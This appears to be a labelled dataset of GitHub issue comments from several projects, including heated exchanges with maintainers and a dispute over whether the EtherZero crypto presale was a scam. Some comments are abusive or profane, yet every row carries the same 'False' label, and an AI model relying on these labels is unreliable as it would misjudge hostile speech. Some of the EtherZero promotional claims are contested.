brew/Homebrew/5687/461376984,5687,"Please be nice with the maintainers, which work on this project on their free time. We all do our best. Watch your tone. Thanks! ",,False
brew/Homebrew/5687/461436849,5687,You don't want that but you are incorrect that the vast majority want that. As @friend has pointed out watch your tone. You also need to read our code of conduct  will happily communicate in whatever way you choose on the issue tracker of your open source projects but you will have to operate how we wish here. ,,False
carbon/dawnlabs/245/298116351,245, Expected Behavior Actual Behavior ,,False
carbon/dawnlabs/245/366549092,245,Duplicate of #28 ,,False
carbon/dawnlabs/245/375919664,245,Running through closing issues all over the place but not actually fixing anything . What the heck do you think you are doing ? The questions are placed looking for fixes not closed stamps . Did they give you that stamp in Kindergarten? ,,False
carbon/dawnlabs/245/375919735,245,"""Does not accept any files or text in Palemoon browser"" ",,False
carbon/dawnlabs/245/375924474,245,"Hey @friend thanks for you comments. We haven't released our fix for Safari support, but I will test if on Palemoon and try and mimick that support there. ",,False
classic-bug-tracker/elysium-project/869/355814414,869,The Lasher's inside of Dire Maul seem to have had their loot tables recently broken.  This has happened before and was eventually fixed. Please look into this as currently the drop rates are non blizz-like. ,,False
classic-bug-tracker/elysium-project/869/417533275,869,"I can confirm that this is indeed true, but I would like to add that the herb spawns are broken as well. I've only been getting 1 herb spawn per reset. ",,False
classic-bug-tracker/elysium-project/869/417728785,869,I can confirm this. This is not Blizz-like. Please fix. Thank you ,,False
classic-bug-tracker/elysium-project/869/417751777,869,"Drops have been a lot less lately, few and far between. ",,False
classic-bug-tracker/elysium-project/869/417773775,869,I do remember when DM first came out the plants were changed from blizz like as the money influx coming from mages farming them was too much but that was a long time ago ,,False
classic-bug-tracker/elysium-project/869/417773876,869,Fixed. Wait for the server restart. ,,False
classic-bug-tracker/elysium-project/869/417796100,869,@friend do you wanna expand what you mean by fixed? ,,False
classic-bug-tracker/elysium-project/869/417901815,869,"@friend  The lashers are still not dropping loot like they are supposed to. Many times out of 5 packs, one or none have loot. ",,False
classic-bug-tracker/elysium-project/869/417905478,869,Lol dude its been 1 day has a patch even happened yet p plz remember we arent a big team like less than a handful of people who are smart and do Dev stuff ,,False
classic-bug-tracker/elysium-project/869/417941745,869,"still a problem, no loot from them, only sometimes a green. 0 herbs ",,False
classic-bug-tracker/elysium-project/869/418006240,869,Apologies for seeming inpatient. That was my misunderstanding.  I read the fix reply as it would go live at the next server reboot. We had one of those on Saturday. Thought that would cover it. Will wait for maintenance cycle.  Thank you for all your hard work and time you sink into this so we can be entertained. &lt;3 ,,False
classic-bug-tracker/elysium-project/869/418014184,869,Yeah shenna should of probs used to other label which ill add on now ,,False
classic-bug-tracker/elysium-project/869/418767624,869,do we know when to expect the fix to be applied to live? ,,False
classic-bug-tracker/elysium-project/869/418787328,869,It can be hard to tell. There are a lot of issues ahead of this in priority. Remember to take breaks from playing WoW its not like farming gold all day is your job P ,,False
classic-bug-tracker/elysium-project/869/418792073,869,I usually farm DM weekdays while at work since being a system admin has slow days if you're maintaining your systems correctly with enough preventative maintenance. It is better than staring at system stat dashboards.  Off to YouTube I go I guess ) ,,False
classic-bug-tracker/elysium-project/869/418830390,869,"I would like to say though, that if this was an intentional loot table change to combat gold sellers it is disappointing.  A lot of us spent time leveling mage alts specifically to farm DM as it is one of the best known farming spots in a true blizz-like setting.  I can only hope that it will revert to blizz like eventually. Thanks for all of your updates and responses on this @friend - A little communication makes a world of difference. ",,False
classic-bug-tracker/elysium-project/869/418851591,869,Still have entire packs with no loot. ,,False
classic-bug-tracker/elysium-project/869/418861959,869, i started playing on elysium when my bf wanted to try it. But a quick google search. It looks like even older servers by elysium might of done this too ,,False
classic-bug-tracker/elysium-project/869/418863192,869,It can be hard to tell how well combating gold sellers works but the elysium project decided they needed to do something... maybe we need a staff bot that appears when a single mage enters DM E and shows the mage a randomized scramble image of letters and numbers the player has to say correctly ;p Cleaned up this page. If youre just saying its not working thats not useful. ,,False
classic-bug-tracker/elysium-project/869/418912975,869,"By removing ways to get gold in game, you're literally encouraging people to buy gold. ",,False
classic-bug-tracker/elysium-project/869/418934550,869,Alrighty well nothing more needs to be done by me. Im unsubscribing and this thread will no longer be moderated. ,,False
contacts/nextcloud/986/419352603,986,"Version 3.0.5 When creating a new contact in the webapp, it submits the contact company as the contact name.  When it syncs to my phone, it shows ""Company"" in the contact list.  The name isn't present. ",,False
contacts/nextcloud/986/471452199,986,"GitMate.io thinks possibly related issues are  (Cant create or save contacts),  (Allow named contact events),  (Contact name displayed as ""New contact"" for contacts with only a number of enterprise name),  (Saved searches), and  (Contacts syncing over CardDav with MacOS contacts, show as company.). ",,False
contacts/nextcloud/986/471453050,986,"Hello, this ia done on purpose! If you don't have a valid  property, the app will try to find the closest appropriate data to use (a  data is mandatory) So it will try to generate one by using the  property, if present, or fallback to using the  property ) ",,False
contacts/nextcloud/986/471453526,986,"So I enter ""Vets (Hemel)"" in the name and then ""Expert Care"" in the company.  It ignores the name I give and just shows the name as ""Expert Care"" on my phone as both the name and the company. I tried several samples, with ""name name"", ""name"", name name name"", and it always uses the company. The only way to get the name is to leave company blank. ",,False
contacts/nextcloud/986/471454513,986,What does the nextcloud's ui displays? ,,False
contacts/nextcloud/986/471454825,986,"The webapp shows the correct detail in the contact list, and in the contact information. ",,False
contacts/nextcloud/986/471456041,986,"I note on my phone that the name of the phone number type, such as Home, is preceded by a double quote.  Not sure if this is related to the field assignments. ",,False
contacts/nextcloud/986/471461764,986,Possibly related to #910 ,,False
contacts/nextcloud/986/471471522,986,"@friend I just removed the company ""Expert Care"" from the above example and the contact in ios updated to show the name ""Vets (Hemel)"". But.... now I have a random contact in the ios contact list under ""#"" which is the number for that contact.  Doesn't appear in the nexcloud list. Something isn't right with the generated vcards. The number here is for the contact Vets above  ",,False
contacts/nextcloud/986/471475745,986,I will need this vcard so I can understand what's going on please ) ,,False
contacts/nextcloud/986/471478431,986,"If I open it in Outlook, the phone number is blank.  If I remove the quotes from TYPE=""WORK,VOICE"" it works fine. ",,False
contacts/nextcloud/986/471483811,986,"Okay, I'm a bit confused here, what issue are we talking about? The tel parameter quotes? The FN field being filled with the ORG's content? The iOS not displaying the contact properly? ",,False
contacts/nextcloud/986/471484534,986,"All of the above. If I put a company name, the number doesn't have a problem but the name does.  The ""home"" designation of a phone number shows a spurious double quote in ios. If I don't put a company name, the name is ok but the number then becomes its own contact. I can open multiple bug reports for each one, but I suspect they are all one in the same. ",,False
contacts/nextcloud/986/471489615,986,"Let's tackle them one by one then. )  what about not having an org name? Does he phone displays properly? What about the nextcloud's ui? Is it behaving properly? Because then this is an iOS issue. If the vCard we generate is correct according to the standards, then iOS is just not following them confused   ",,False
contacts/nextcloud/986/471492471,986," Almost.  Where it shows the phone number or email type (e.g. Home, Work), it actually shows in all capitals with a leading double quote (e.g. ""HOME, ""WORK).  This appears to work fine.   This wasn't an issue prior to the 3.0.3 (ish) update I believe.  It was working fine for a long time, then I did a new install on a new server and contacts wasn't quite right. ",,False
contacts/nextcloud/986/472612318,986,@friend where do you generate the .vcf file?  I'm going to try and fix it myself. ,,False
contacts/nextcloud/986/475403075,986,@friend is more info needed?  I've confirmed the vcf is erroneous in ios and Outlook.  Seems like a bug. ,,False
contacts/nextcloud/986/475689282,986,"Sorry, this one slipped through ) Please post a screenshot of every vcf that failed and the associated vcf file. I need to have a proper visibility of what error/issue we have for each case. It's getting confusing for me with all those vcard example on every issues see_no_evil ",,False
contacts/nextcloud/986/475763835,986,"@friend they're all the same as the example above.  The problem is with the quotation marks on the phone number type (e.g. ""work,voice"").  If I remove the quotes it works in ios and outlook. Something is applying tags wrongly and it's causing the vcf to be invalid. Let me open a new issue for this vcf error.  This one should stick to the problem of company name over taking the person's name. ",,False
contacts/nextcloud/986/478929745,986,"@friend edited a contact on my phone and it wiped all the numbers for that contact.  Contact shows in the list in the app online, but no numbers. This app is now fundamentally broken, and there is a lack of reply from development, so I'm classing this as closed and moving to an alternative. ",,False
contacts/nextcloud/986/478945801,986,"@friend I'm sad to hear that! Lots of development is pushed towards this app, but maybe not on this issue. There are a lot of requests or discussions, and not only on the contacts app. Different priorities and focus. This is still an open source project, anyone can contribute. Could you help and fix the issue maybe? That would be awesome! ",,False
contacts/nextcloud/986/478947477,986,"@friend I would consider inability to edit contacts on a phone, names being incorrectly shown due to a feature attempt by devs, and incorrectly formatted vcf files as pretty fundamental and high priority. Unfortunately, I did ask questions to get me started above, but was ignored.  So I'm out. ",,False
contacts/nextcloud/986/478949596,986,"Sure, I would too! Unfortunately I was not able to properly understand your issue. I'm sorry I was not able to provide the solution in the timeline you expected. I wish you a good day! Cheers, John ",,False
contacts/nextcloud/986/478970883,986,"@friend we are a community-driven project, so sometimes replies or debugging issues can take some time. The more info you provide, the easier it is to reproduce and fix it. Please be mindful of that and keep a friendly tone according to our Code of Conduct ",,False
contacts/nextcloud/986/478973656,986,"@friend a community I support with various bug reports and information, along with an attempt above to join it directly (as mentioned, was ignored). It's disappointing that only when I complain I get quick replies.  I have continuously responded and waited, only to be told that more info is needed after I indicate I'm done waiting - couldn't have said it sooner? I've been polite and as helpful as possible throughout.  If the frustration shows, I suggest consideration be given to the cause and not the outcome. I won't be replying again.  As above, I'm using another app outside of Nextcloud. ",,False
core/opnsense/2036/354585943,2036,"ok, it's understood (for now). lol, wut? You've just said it will be bridged, but ok, what's next there? Assign what ""this"" interface? Create bridge where? And why would one need to assign an interface here if he's supposed to create bridge ""separately""? It will make sense to specify bridge then may be? ok, if it's purely OpenVPN option you'd better refer to it as it's given in OpenVPN docs. It would be less confusing after all. P. S. This is the thing why one should never use any ""panels"" for whatever. It's simple to get things done with primary tools then to get through all that addons-stuff ",,False
core/opnsense/2071/287308368,2071,"Yeah, you know — those bridges that can be configured there interfaces_bridge.php What's worse — you don't allow to specify voluntary interface names in NAT rule editor. That's again (another) proof that with the approach you've chosen it's way wiser to install BSD and do needed config manually. ",,False
core/opnsense/2071/356506240,2071,"It's true. We're not fond of the approach of how bridges are integrated. For that reason we do recommend hardware switches which do the job just nicely for very little money of need be. However, in the scope of this ticket, what can we do to help make the system in place a bit less cumbersome? ",,False
core/opnsense/2071/356532135,2071,"Nope, you can't replace bridges with anything external; such virtual bridges can be used as glue for VPNs and LAN interfaces and so on. What does original OS allow? It allows entering any interface name in PF rule set. And, BTW, that really does make sense cause not all interfaces exist all the time. Some of them can be sprung/ceased during uptime. So, at least this approach ""don't narrow allowed choice scope"" would help to mitigate  this and similar problems. ",,False
core/opnsense/2071/356626951,2071,What is your use case? I'm terribly sorry for not being able to follow. ,,False
core/opnsense/2071/356628470,2071,That's exactly the thing! — Having hard coded values for option (interfaces choice in PF is an example) w/o giving users an ability to override them makes opnsense unable to follow. ,,False
core/opnsense/2071/356628811,2071,"Wait, are you questioning the GUI + config.xml approach now? I thought we were talking about bridges? ",,False
core/opnsense/2071/356629366,2071,"Ah, ok, we can't, because if we do that it won't be reproducible after config export + import. ",,False
core/opnsense/2071/356629433,2071,We also did. As to my very case — it's combining 2 network Ethernet LAN segments into a single one with VPN and bridging. But in fact I also mentioned it earlier  ,,False
core/opnsense/2071/356629832,2071,"well, PF allows you to specify anything as NIC name. The rules with it just won't have any effect if it's non present at run time. But, well, ok, you can't. That's the thing why it's not wise to install opnsense instead of BSD. ;) ",,False
core/opnsense/2071/356630449,2071,"The design goal is to not let the user edit raw files to provide verification and validation of the setup. It's not a console-based BSD, that's true. It's also uncommon to ""glue"" VPNs as normally network segregation is a wanted security aspect. ",,False
core/opnsense/2071/356630643,2071,"You're typical ""we know better what users need"". But in fact you're too lame to realize it ",,False
core/opnsense/2071/356631194,2071,proof ,,False
core/opnsense/2071/356631202,2071,"@friend be polite please, if OPNsense doesn't fit your needs, feel free to use any other product available.. ",,False
core/opnsense/2071/356631226,2071,"Ok, can I help you with something else? ",,False
core/opnsense/2071/356631373,2071,I never meant to be polite to stupidity ,,False
core/opnsense/2071/356631596,2071,"I guess that is a no then. ) Cheers, Franco ",,False
core/opnsense/2071/356632010,2071,Sure. I made up my mind; I'm also letting others know what they would face if they would try using pfsense^W opnsense. — Its lame developers won't allow you to achieve full potential of original opensource software they've combined into this very ergh project. ,,False
cups/apple/5315/323772139,5315,"I have an HP Photosmart Plus B210a which prints pages face up. I am trying to figure out how to configure Cups to print documents so that I don't have to reverse them by hand when they come out of the printer. I found a discussion on linuxquestions.org which summarizes a recommended fix  Add the line  *DefaultOutputOrder ""reverse""  to the file  /etc/cups/ppd/PrinterName.ppd  I have tried this with varying results. I printed twelve two-page documents to try to investigate what is happening. I tried printing via the  command, via Evince and via Okular. I tried using a ppd file with and without the  line, and I also tried specifying a default output order with  of ""reverse"" or ""normal"" lpoptions -dHP_Photosmart_Plus_B210a -o outputorder=reverse ... lpoptions -dHP_Photosmart_Plus_B210a -o outputorder=normal  The results   Ignores ppd line, honors lpoptions setting Evince Ignores lpoptions setting, honors ppd Okular Ignores both lpoptions and ppd  As with the reporter of #1679, I would have expected the PPD which is downloaded by default for my printer to give the ""correct"" behavior by default, which is to say, not requiring me to manually reverse long documents when they come out of the printer. I also tried the solution of #1679, using lpadmin -p printer -o outputorder-default=reverse lpadmin -p printer -o outputorder-default=normal  This setting was honored by Evince but not by  or Okular. Okular's print dialog allows the user to change the ouput ordering, but Evince's print dialog, which appears more ""standard"" to me, says ""Page Ordering Not available"". There was some mention of all documents going through  as a final filter. If this is true then it should be possible for Cups to give users a single point at which to configure output ordering, which works uniformly across all applications which might submit print jobs to Cups. In either case it should be documented what is the preferred way to deal with face-up printers. I humbly offer my suggestion that for ""outputorder=reverse"" to work intuitively as a per-job option, then it should interact with the per-printer option as a parity bit, e.g. reverse+reverse=normal, rather than as an ""override"" (reverse+reverse=reverse). In my experimentation it seems to be the latter, and I think this should be documented because it is somewhat different from the way that other options like ""page-ranges"" work. If I write a script to print the odd pages in order and then the even pages in reverse, I feel I should be able to get the same result (manual duplex) regardless of the printer model. In any case where the  man page says   -o outputorder=reverse       Prints pages in reverse order.  I think it maybe should say something like   -o outputorder=(reverse|normal)       Overrides printer output-order setting for this job. With       ""outputorder=reverse"", document will be reversed on       face-down printers, and correctly ordered on face-up       printers; and vice-versa for ""outputorder=normal"".  Here is my PPD file in case it helps HP_Photosmart_Plus_B210a.ppd ",,False
cups/apple/5315/389912141,5315,"OK, so I'm assuming from the list of applications you are using that you are using a Linux distribution of some sort. The PPD comes from the HPLIP project. Unfortunately, this isn't something we can help you with - either the cups-filters raster filter is not honoring the DefaultOutputOrder value in the PPD or the HPLIP driver isn't doing something right. Either way you need to start with your Linux distribution's bug reporter and go from there... ",,False
cups/apple/5315/389954289,5315,"Michael, I can submit the bug elsewhere but do you really mean to suggest that I need to know about HPLIP and cups-filters to understand why three different tools process the options I've set (using your software) in three different ways? What about the other questions I asked? You don't think any of your documentation needs to be fixed? Can you point me to the place in the documentation where you say which of lpadmin/lpoptions/PPD solutions is expected to make the printer work correctly with all CUPS clients? Who takes responsibility when other projects don't know how to interface correctly with your software? Can you give the HP people a hint on how the HP filter would need to be modified so that it respects the  setting not just with Evince print jobs but also with jobs submitted by Okular and ? Or how can Okular be modified so that it prints correctly on inkjets? Is there another brand of inkjet printers, which works correctly with CUPS? What about cups-pdf, I've noticed that when printing to the virtual PDF printer then  doesn't respect the lpadmin setting, Evince doesn't respect the lpoptions setting, and Okular doesn't respect either. Is that still an HP problem? Are you ever grateful to receive bug reports about your project? ",,False
cups/apple/5315/389956054,5315,"@friend The non-CUPS software is not following the standard interfaces that CUPS provides. IOW, this is either a bug in HPLIP or cups-filters. If they follow the standard interfaces you won't have to do a damned thing to have things Just Work™. We can't fix software that isn't ours... As for pstops, no not all jobs get routed through there. Maybe 18 years ago that was the case, but not today. As for the documentation, it is correct if the underlying driver or filters follow the standard interfaces. ",,False
cups/apple/5315/390071106,5315,"So cups-pdf is HP's problem too? Is there any Linux software you can name that interfaces with CUPS correctly? It would help to have an answer to this question, relating to the configuration of face-up printers ""Can you point me to the place in the documentation where you say which of lpadmin/lpoptions/PPD solutions is expected to make the printer work correctly with all CUPS clients?"" ",,False
cups/apple/5315/390228055,5315,"cups-pdf is from another developer. Both depend on cups-filters on Linux, which probably means that the problem lies with cups-filters. We do not document printing solutions for Linux, working or otherwise. We don't write or support the software, and we don't make the distributions. ",,False
debug/visionmedia/547/298397520,547,"I use ES6 plus Babel plus optional uglify-js. Debug example to show the problem When I do NOT use , everything is ok and the output is However, when using ""color #CC9933""%s` argument. ",,False
debug/visionmedia/547/366812782,547,I'm trying to make a tiny project that shows the problem. ,,False
debug/visionmedia/547/366826173,547,"After hours trying to reproduce the issue in a fresh project, I've realized that the issue was due to the fucxxxx . Deleting it and  and calling  again fixed the issue. NPM is becoming really a pain nowadays... Sorry for the noise. ",,False
debug/visionmedia/547/369629508,547,"what's your uglifyjs config? I have same issue here. I set collapse_vars to false to avoid this issue before, but it's not working now. ",,False
debug/visionmedia/547/369633808,547,"No one, I just use . The issue, in my case, disappeared after a proper  and some complains to NPM stuff (which is a pain today). ",,False
debug/visionmedia/547/379780167,547,"Hi there, I've got the same issue over here (though minification happens via tinyify (which uses uglifyjs) in a Babelify-transformed Browserify project. I've tried re-installing the node_modules as suggested by @friend but didn't get anywhere. I don't have a  in this project. @friend  did you find a solution for this? ",,False
debug/visionmedia/547/397272319,547,"Thanks for the answer, sorry for the delay. I was using Browserify when I asked my question with uglifiify running uglify-js and could not find a way of directly passing options like  to it. Maybe that's where things got confused – I've since switched to Webpack with  and don't have this issue anymore. ",,False
debug/visionmedia/547/413123085,547,"I'm seeing the problem in uglifyjs-webpack-plugin, I've set the webpack.config to include and its still giving the weird ""color"" output reported by @friend ",,False
debug/visionmedia/547/413371124,547,"It would be good if this was documented, its an obscure hack to work around this issue with debug, and its unlikely people will find it in this closed issue. Even more obscure if you don't explicitly use Uglify, just the default webpack.  I had to add the following to get it to work. ",,False
debug/visionmedia/547/413584662,547,"When using tools like angular-cli,  isn't easily changed. It would be great if debug was able to work properly under default production webpack settings. ",,False
debug/visionmedia/547/413591428,547,"It would be even greater if libraries worked fine without depending on specific settings in other libraries. I think that's better than ""make it work for my use case, plz"". ",,False
debug/visionmedia/547/432721088,547,This issue is not really closed ... could be great to re-opened it ,,False
debug/visionmedia/547/432754117,547,"We're not doing anything crazy, here. We're not pushing Javascript to its limits, we're not expecting any weird or new syntax to work (at least, not until v4 when we switched to ES6). If UglifyJS is messing up code, that's its own fault. Please open a ticket there. It is not the job of a library like this to conform to random tools such as UglifyJS. They are supposed to accommodate the libraries upon which they operate, not the other way around. There is nothing actionable on 's end to fix anything, because there is nothing wrong here. UglifyJS should not be changing functional semantics, so if it does so in a breaking way, take it to the maintainer of UglifyJS. Or you can use something more modern and active, such as Babel or Terser. ",,False
debug/visionmedia/547/432765152,547,AFAIR I've no longer seen this issue by using Terser. 100% agreed with @friend. ,,False
debug/visionmedia/547/432974943,547,"We just tell that the printf syntax is unusable in minified version in browser, with a product out of the box and widely used like webpack (18.5M download) / uglify (35.1M). The answer of Uglify, we will know it, there is an option for that. Someone tell that it will cost 5% of js size. Every byte so heavily win is important. I will not make a migration of the minifier for ""only"" a logger problem. I will make the calls without printf syntax. it will be ugly, but in less 10 minutes it will be done. thank you for your no help. ",,False
debug/visionmedia/547/432976810,547,This isn't a logger problem. UglifyJS is breaking your code. That should be setting off alarms and red flags for you. You're welcome. Please take your attitude elsewhere. ,,False
dxvk/doitsujin/492/340106316,492,So in Farcry 5 a small issue regarding car steering has come up i can't turn left or right even when remapping the controls Software information Farcry 5 Mazed out System information  GPU R9 290X Drivermesa 18.1.3 Wine version 3.10 e-sync DXVK version 0.61   ,,False
dxvk/doitsujin/492/404066810,492,Input issue -&gt; not a DXVK bug. ,,False
dxvk/doitsujin/492/404150344,492,Any idea on how to fix the input issue ? I have xinput installed anything else would be big help Sent from my iPhone ,,False
dxvk/doitsujin/492/404285383,492,"This is not the place to ask that question, as it has nothing to do with DXVK. ",,False
dxvk/doitsujin/492/404300381,492,Getting real tired of lazy Linux assholes whatever dude you want to be a fuck face that’s not willing to help people so be it Sent from my iPhone ,,False
dxvk/doitsujin/492/404302777,492,Not going to bother with personal insults. ,,False
eth-phishing-detect/MetaMask/653/288451825,653,"Dear Meta Mask team, We found MetaMask have blocked access to our website EtherZero.org, we are making a ethereum fork and presell some coin to our early investors.  We also found some dangerous with the method to import private key into our website wallet or Meta Mask fork plugin to get EtherZero, so we will recommend users add a custom node to MEW or Meta Mask to get ETZ later. I don't know why Meta Mask block our site, it's unfair and please you can re-check it again, Thank you! ",,False
eth-phishing-detect/MetaMask/653/357557781,653,"MetaMask works find on the wallet when you search (EtherZero Wallet), same goes for KeepKey and Ledger Nano. Importing private key should only be done on websites which are secured (such as  or  . Also, please correct the sending address to buy ETZ, because first it was 0xe4ba55b67b5596eaac5000b724dff7e86ad83196, then it was 0xf33068d5e798f6519349ce32669d1ec940db1193 and now it is 0x7E416ACB49c0B0d928BAda074Bf6597D80740bC2. And only the last one (0x7E416ACB49c0B0d928BAda074Bf6597D80740bC2) is mentioned in the tweets, telegram messages, websites and blogs. Please correct this. ",,False
eth-phishing-detect/MetaMask/653/357562192,653,"  is not our website, don't go to there! And don't send ETH to anyone address. Our pre-sale have been paused! ",,False
eth-phishing-detect/MetaMask/653/357562282,653,But ethzero.org is marked for fake and the address was removed to send ETH so that's suspicious. And no Ledger Nano support on ethzero but there is on ethzero-wallet.org ?? ,,False
eth-phishing-detect/MetaMask/653/357562514,653," is our official website, don't go to others or your ETH will be stolen! ",,False
eth-phishing-detect/MetaMask/653/357562643,653,But every analytic urlscan says etherzero.org is fake?? ,,False
eth-phishing-detect/MetaMask/653/357566496,653,"Don't reply to my post, you can steal some ETH but just it. ",,False
eth-phishing-detect/MetaMask/653/357566741,653,"Lol, no code repository, no opensource, no whitepaper and now even taken down for illegal use of MetaMask. Give me a break. Changing ETH receive address 3 times and even sending it to your own wallets back and forth. The fork is real and claiming ETZ is real, but this is just childish. ",,False
eth-phishing-detect/MetaMask/653/357655465,653,"Hi Admin, Please have a look at our official telegram  and check it out what we are doing. Thanks! ",,False
eth-phishing-detect/MetaMask/653/357720314,653,"@friend I am the one who issued the blacklist.  You mention it's going to be a 11 ETZ/ETH fork in your bitcointalk post, but during sale I can buy 3300ETZ for 1 ETH - this doesn't add up. Everyone is sending funds to 1 address to buy these ETZ tokens which doesn't make sense in terms of a sale - how will you track and issue tokens to who contributed what with the correct amount? There was no whitepaper (at time of blacklist) You're asking people to import their private keys into 3rd party software that isn't auditable/released and say it's the only way to get your ETZ tokens. You say your team is 20 people with cooperative tasking with top dapp shops in India and Eastern Europe yet all your repos have 1 contributor from the ETZ team (which is an anonymous contributor) and that's just changing existing ETH/MetaMask/MEW branding to ETZ. Your fork was cancelled and 5 days later open up again with zero explanation.   ",,False
eth-phishing-detect/MetaMask/653/357733464,653,"Hi,  It's a 11 fork but we also pre-mine 97M, and 20M will be sold to early investors amd 77M will be reserved for reservation, i don't think it's illegal. We have released everything on the get ETZ page  before investors send ETH to us.   And we have refunded all the requests investors asked. You can check our address  and  ask investor send ETH to us from a compatible wallet and we collect the sending address from etherscan.io, so we can send ETZ to their addresses later.  WP have been uploaded  have found some dangerous with the method to import private key into our website wallet or Meta Mask fork plugin to get EtherZero, so we will provide users a custom node to be added to MEW or Meta Mask to get ETZ, or you can add your notes. You can find the info have been updated at  are 20 people team, 9 core team members in China, one team located in India, one in eastern Europe to help us. It's a hard fork project, so we forked other codes including Meta Mask, but we also would like to use Meta Mask  if it's compatible. We only use it as a test wallet.   PS 0 TX fee have been implemented on our test wallet ETZ's test wallet has been running on the test network and can download from here  tutorial   unzip wallet  open chrome//extensions/ in Chrome browser  drag the unzip folder to the extension interface  this is a Meta Mask version of the fork version of the wallet, the same as Meta Mask  in the telegram group you can add the administrator in private, we can send some ETZ test currency to you (only can be tested on the test net, later we will clear it).  We have explained it on our telegram before(at the first we want to hard fork ethereum, but then want to make a ICO instead as a private investor encouraged us made a ICO, but this way didn't work so we restarted the HF). It's 6180 members group, we didn't cheat anyone or their ETH, if you can proof it we won't said anything about the incorrectly flagged.   EtherZero has all the dream features needed by DAPP developers 0 TX fee, instant payments and high scalability(up to thousands of TPS). Made by Dapp developers, for Dapp developers. I thought we are doing a new ways for DAPP development, many developers will need these features. It's critical to our project as many users used Meta Mask, and we also recommended they to use Meta Mask and MEW for helding ETH to get ETZ for free for many times. If you need anything we would like to provide to you asap. Thank you very much! ",,False
eth-phishing-detect/MetaMask/653/357760322,653,"Sorry ETZ -- but you've lied to every investor. Your announcement articles that lead to people investing were stating only a modest 20M premine. You've since changed this completely. You are scammers. Note You edited your announcement post on  edited your advertisements TODAY and hid evidence of this fraud. Your own employees are contacting the press and warning people not to invest. You have no way of explaining what you have done to investors. All you can do is hide the evidence and tell stories. Your whole business is based on a lie in your marketing material (that you routinely change, just like the ETH addresses you have your victims send ETH to) claiming you can handle thousands of transactions per second, zero transaction fees, and somehow survive DDOS attacks. Where is the code? ",,False
eth-phishing-detect/MetaMask/653/357794747,653,Thanks @friend for this investigation. It can't be more clear this is a huge scam. ,,False
eth-phishing-detect/MetaMask/653/357799858,653,"Guys,  I think that you are all over-reacting.   I believe that the project has potential and has gained community support. ",,False
eth-phishing-detect/MetaMask/653/357834877,653,"Hi, Do your research more and you will find the true. We changed the plan just want to protect our early investors, they all get 10X ETZ at the same ETH sent. Do your research more and you will find the true. No one want a refund and if they ask, we just send back their ETH. They are not our employees ever! They want to work for us, but we rejected them. So bad things happenned. We didn't want to hide anything, just bc the code is not ready, it will be open soure soon. True is true and time will tell. Be a wiser man please! ---- On Mon, 15 Jan 2018 124034 -0600 etherenvoy &lt;notifications@friend.com&gt; wrote ---- Sorry ETZ -- but you've lied to every investor. Your announcement articles that lead to people investing were stating only a modest 20M premine. You've since changed this completely. You are scammers. Note You edited your announcement post on  edited your advertisements TODAY and hid evidence of this fraud. Your own employees are contacting the press and warning people not to invest. You have no way of explaining what you have done to investors. All you can do is hide the evidence and tell stories. Your whole business is based on a lie in your marketing material (that you routinely change, just like the ETH addresses you have your victims send ETH to) claiming you can handle thousands of transactions per second, zero transaction fees, and somehow survive DDOS attacks. Where is the code? — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub, or mute the thread. ",,False
eth-phishing-detect/MetaMask/653/357852192,653,"We changed the plan just want to protect our early investors, they all get 10X ETZ at the same ETH sent. Anyone want a refund and if they have asked, we just send back their ETH.  They are not our employees ever! They want to work for us, but we rejected them. So bad things happened. We didn't want to hide anything, just bc the code is not ready before the fork, it will be open source soon. And please read this article and you will find more interesting things ",,False
eth-phishing-detect/MetaMask/653/357857263,653,"Where is the code that allows for 10,000 tx/s and unlimited scalability on the Ethereum network?Vitalik has been wasting his time working on sharding -- I'm sure he'd like to see it. Where is it? Open the repository. Let people see. Why would you take investment with an advertisement of 116M total, and then, 3 days before launch, change it to 197 M total -- giving yourselves control of the entire market people invested in thinking it was a modest, decentralized fork? There is no why -- you lied to bitcointalk.org, lied to the media, lied to investors, lied to employees doing sales for you. ETZ, if it ever exists, will be worth very little after you centralize it and give yourselves total market control without warning the people who were investing for weeks. Are you still launching on the 19th -- 3 days from now? ",,False
eth-phishing-detect/MetaMask/653/357863248,653,"You must have not check our website and WP. The 10K TPS is the next phase of ETZ. Marketing plan always need to be changed to fit the resources we had. We have increased the total number of ETZ from 116M to 194M, but also provide 16.5 times of ETZ to our early investors. The price of ETZ is 10% of previous price. And we also issued refunds if anyone asked. We didn't have employees doing sales for us, just one man called David asked to work for us.  He also asked money to members from EtherZero telegram group and want to scam ppl for selling ETZ he didn't have. He is banned from the group. lol We have implemened 0 TX fee on our test wallet and testnet and the HF will be happened on 19th, Jan. ",,False
eth-phishing-detect/MetaMask/653/357865529,653,你需要理解一下。我没有讹诈你 。这不是勒索。 你对国外的投资者撒谎，人们生气。 这与我真的无关。我们谈实话可不可以？ When you started taking investment from westerners (1) You do not have the code done (2) You did not have a white paper (3) You were claiming 116M total ETH， after investment 197M. The market will be very different. 你开始拿到外国人的投资的时候 一 变成没做好，也没github 二 没有完成的WP 三 原来是116M，拿到投资以后你高速人是197M。市场，投资会超级不同的。 ,,False
eth-phishing-detect/MetaMask/653/357874175,653," As a chinese, I think you shouldn't be a translator as your chinese is really funny. ",,False
eth-phishing-detect/MetaMask/653/357875135,653," won't change anything on our article about you E E. Let me ask your questions  We had provide test wallet running on testnet before the presale - you didn't tell the truth  We have told our early investors WP will be updated soon, and they trusted us, and we also delivered our promise, the WP can be downloaded here  plan always need to be changed to fit the resources we had. We have increased the total number of ETZ from 116M to 194M, but also provide 16.5 times of ETZ to our early investors. The price of ETZ is 10% of previous price. And we also issued refunds if anyone asked."" - I have asked it before  Shame on you as a Chinese. EtherZero is a global project, we have many supporters from China, also many supporters from all of the world. You are hurting the reputation of EtherZero, and provide nothing else to the world. ",,False
eth-phishing-detect/MetaMask/653/357878392,653,"David, your sales employee, says you didnt pay him. He says you blocked him and banned him from the channel. Why did you do this? Are you going to pay him? He worked every day getting you ""investment"" while being told the cap was 116M. You take everyone's money first, fire your sales employee with no pay, and then you ""change the marketing plan"" and give yourselves 50% of the market in premined ETH? And you think I am worried you make up a conspiracy theory about me? I was interested in your platform -- it sounded good (0 gas fee, 999999 txps). You have no code though, and so I wrote it off as a scam and warned people. ",,False
eth-phishing-detect/MetaMask/653/357879789,653,"He is not our sales employee, he asked for help being an group supporter on our telegram channel. And we have paid him  are not telling the truth, we also had your chat log with David, if you want we can upload more. You can do what you want, but we won't pay you a penny as mentioned here ",,False
